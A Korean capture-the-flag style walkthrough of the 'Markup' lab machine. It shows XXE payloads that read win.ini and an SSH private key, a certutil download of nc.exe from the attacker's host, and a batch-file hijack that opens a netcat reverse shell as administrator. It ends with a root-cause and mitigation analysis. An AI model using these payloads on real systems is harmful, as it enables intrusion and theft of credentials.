# Markup

## 개요

Apache 웹 서버에서 동작하는 쇼핑몰 애플리케이션의 XML 처리 과정에서 발생하는 XXE(XML External Entity) 취약점을 이용해 초기 접근권을 획득하고, 일반 사용자 계정이 가진 파일 쓰기 권한과 관리자 권한으로 실행되는 배치 스크립트를 조합해 administrator 권한까지 상승하는 Windows 머신이다. HTML 소스코드 정보 노출, XXE를 통한 SSH 개인키 탈취, 파일 권한 오설정이라는 세 가지 취약점이 하나의 공격 체인으로 연결된다.

---

## 대상 정보

| 항목 | 내용 |
|------|------|
| 머신 이름 | Markup |
| OS | Windows Server 2019 (10.0.17763.107) |
| IP | 10.129.22.170 |
| 난이도 | Very Easy (Tier 2) |
| 주요 취약점 | XXE Injection, HTML 주석 정보 노출, SSH 개인키 노출, 파일 권한 오설정 |
| 주요 기술 | XXE, SSH 개인키 인증, certutil 파일 전송, 배치 스크립트 하이재킹 |

---

## Enumeration

### TCP 스캔

```bash
nmap -sC -sV 10.129.22.170
```

![nmap tcp scan](images/nmap-tcp-scan.png)

열린 포트는 3개다.

| 포트 | 서비스 | 설명 |
|------|--------|------|
| 22/tcp | SSH | OpenSSH for_Windows_8.1 |
| 80/tcp | HTTP | Apache httpd 2.4.41 (Win64) PHP/7.2.28 |
| 443/tcp | HTTPS | 동일 서비스, SSL |

OS가 Windows임을 `OpenSSH for_Windows` 문자열에서 바로 확인할 수 있다. PHPSESSID의 httponly 플래그가 설정되지 않은 점도 확인됐다.

### 웹 서버 분석

브라우저로 접속하면 `MegaShopping` 쇼핑몰 사이트가 표시된다. 로그인 후 Order 메뉴로 이동한다.

![web login home](images/web-login-home.png)

기본 크리덴셜 `admin:password`로 로그인에 성공했다.

### HTML 소스코드 분석

Order 페이지(`services.php`) 소스코드를 확인했다.

```
Ctrl + U
```

![html source daniel comment](images/html-source-daniel-comment.png)

HTML 주석에서 개발자 이름이 노출됐다:

```html
<!-- Modified by Daniel : UI-Fix-9092-->
```

`Daniel`이 시스템 계정명으로 사용될 가능성이 높다.

소스코드에서 XML 처리 방식도 확인됐다.

![html source xml post process](images/html-source-xml-post-process.png)

폼 데이터가 XML로 조립되어 `process.php`로 POST 전송된다:

```javascript
var url = 'process.php';
http.open('POST', url, true);
http.setRequestHeader('Content-Type', 'text/xml');
http.send(xmlTemplate);
```

서버가 XML을 파싱하는 구조이므로 XXE 취약점 가능성이 있다.

---

## 취약점 공격

### XXE 동작 확인

로그인 세션 쿠키를 획득한 뒤 XXE 페이로드를 전송한다.

```bash
curl -s -c /tmp/cookies.txt -X POST http://10.129.22.170/ \
  -d 'username=admin&password=password'
```

![curl login phpsessid](images/curl-login-phpsessid.png)

![cookies txt phpsessid](images/cookies-txt-phpsessid.png)

PHPSESSID 획득 후 XXE 페이로드를 전송한다. `<!ENTITY xxe SYSTEM "file://...">` 구문으로 외부 엔티티를 정의하고 `&xxe;`로 참조하면 서버가 해당 파일을 읽어 응답에 포함한다. Windows 시스템 파일인 `win.ini`로 먼저 동작을 검증했다.

```bash
curl -s -b /tmp/cookies.txt -X POST http://10.129.22.170/process.php \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>'
```

![xxe win ini confirmed](images/xxe-win-ini-confirmed.png)

`win.ini` 내용이 응답에 포함됐다. XXE가 동작한다.

### Daniel SSH 개인키 탈취

HTML 주석에서 확인한 `Daniel` 계정의 SSH 개인키를 XXE로 읽는다. Windows SSH 개인키 기본 경로는 `C:\Users\<username>\.ssh\id_rsa`다.

```bash
curl -s -b /tmp/cookies.txt -X POST http://10.129.22.170/process.php \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>'
```

![xxe daniel id rsa](images/xxe-daniel-id-rsa.png)

`-----BEGIN OPENSSH PRIVATE KEY-----`로 시작하는 개인키 전체를 획득했다.

### SSH 접속

획득한 개인키를 파일로 저장하고 SSH 접속한다.

```bash
chmod 600 /tmp/id_rsa
ssh -i /tmp/id_rsa daniel@10.129.22.170
```

![ssh chmod daniel login](images/ssh-chmod-daniel-login.png)

![ssh daniel shell](images/ssh-daniel-shell.png)

`daniel@MARKUP` 쉘 획득 완료.

---

## 권한 상승

### Log-Management 폴더 확인

```cmd
dir C:\Log-Management
```

![dir log management job bat](images/dir-log-management-job-bat.png)

`job.bat` 파일이 존재한다.

### job.bat 내용 분석

```cmd
type C:\Log-Management\job.bat
```

![type job bat contents](images/type-job-bat-contents.png)

`bcdedit`으로 관리자 권한 여부를 확인한 뒤 `wevtutil.exe`로 Windows 이벤트 로그 전체를 삭제하는 스크립트다. 관리자 권한으로 실행되도록 설계되어 있어 자동 실행 메커니즘이 존재함을 알 수 있다.

### 파일 권한 확인

```cmd
icacls C:\Log-Management\job.bat
```

![icacls job bat full control](images/icacls-job-bat-full-control.png)

```
BUILTIN\Users:(F)
```

`(F)` = Full Control. Daniel이 `Users` 그룹 멤버이므로 `job.bat`을 자유롭게 수정할 수 있다.

### nc.exe 업로드

Windows에는 기본 netcat이 없으므로 공격자 머신에서 `nc.exe`를 HTTP 서버로 제공하고 `certutil`로 다운로드한다.

공격자 머신에서:

```bash
cd /usr/share/seclists/Web-Shells/FuzzDB/
python3 -m http.server 8000
```

![python http server nc exe](images/python-http-server-nc-exe.png)

Daniel 쉘에서:

```cmd
certutil -urlcache -f http://10.10.14.167:8000/nc.exe C:\Log-Management\nc.exe
```

![certutil nc exe upload](images/certutil-nc-exe-upload.png)

![http server nc exe request](images/http-server-nc-exe-request.png)

### job.bat 하이재킹

공격자 머신에서 nc 리스너 실행:

```bash
nc -lvnp 4444
```

Daniel 쉘에서 job.bat을 리버스 쉘 명령으로 덮어쓴다:

```cmd
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.14.167 4444 > C:\Log-Management\job.bat
```

![job bat overwrite nc payload](images/job-bat-overwrite-nc-payload.png)

자동 실행 메커니즘이 job.bat을 관리자 권한으로 실행하면 nc.exe가 트리거되어 리버스 쉘이 연결된다.

### administrator 쉘 획득

![nc reverse shell administrator](images/nc-reverse-shell-administrator.png)

`markup\administrator` 권한으로 리버스 쉘이 연결됐다.

---

## 플래그 획득

```cmd
type C:\Users\daniel\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

![user flag](images/user-flag.png)
![root flag](images/root-flag.png)

---

## 취약점 원인 분석

### 근본 원인

| 취약점 | 위치 | 근본 원인 | OWASP |
|--------|------|-----------|-------|
| HTML 주석 정보 노출 | `services.php` 소스코드 | 개발자 이름이 주석에 그대로 노출 | A05 Security Misconfiguration |
| XXE Injection | `process.php` XML 파서 | 외부 엔티티 처리를 비활성화하지 않음 | A03 Injection |
| SSH 개인키 노출 | `C:\Users\daniel\.ssh\id_rsa` | XXE로 접근 가능한 경로에 개인키 존재 | A02 Cryptographic Failures |
| 파일 권한 오설정 | `C:\Log-Management\job.bat` | 일반 사용자(Users)에게 Full Control 부여 | A01 Broken Access Control |
| 배치 스크립트 하이재킹 | `job.bat` 자동 실행 | 쓰기 가능한 스크립트를 관리자 권한으로 실행 | A01 Broken Access Control |

### 실제 환경에서의 위험성

XXE는 단독으로도 서버 내부 파일 읽기, SSRF, 포트 스캔 등 다양한 공격으로 이어질 수 있다. 특히 이 머신처럼 SSH 개인키가 XXE로 읽히는 경우 인증 우회를 통한 초기 접근으로 즉시 연결된다. XML 파서에서 외부 엔티티 처리를 비활성화하는 것만으로 이 공격 체인 전체를 차단할 수 있다.

파일 권한 오설정은 Windows 환경에서 특히 자주 발견된다. 관리자 권한으로 실행되는 스크립트나 서비스 바이너리에 일반 사용자 쓰기 권한이 있는 경우 권한 상승으로 즉시 이어진다. 최소 권한 원칙(Principle of Least Privilege)을 파일 시스템 권한에도 적용해야 한다.

---

## 핵심 정리

| 단계 | 기술 | 도구 |
|------|------|------|
| 포트 스캔 | TCP 열거 | nmap |
| 웹 로그인 | 기본 크리덴셜 시도 | 브라우저 |
| 정보 수집 | HTML 주석에서 사용자명 확인 | 브라우저 소스보기 |
| XXE 동작 확인 | win.ini 읽기 | curl |
| SSH 개인키 탈취 | XXE로 id_rsa 읽기 | curl |
| 초기 접근 | SSH 개인키 인증 | ssh |
| 파일 권한 분석 | job.bat Full Control 확인 | icacls |
| nc.exe 업로드 | certutil HTTP 다운로드 | python3, certutil |
| 권한 상승 | job.bat 하이재킹 | echo, nc |
| 플래그 획득 | administrator 쉘에서 파일 읽기 | type |
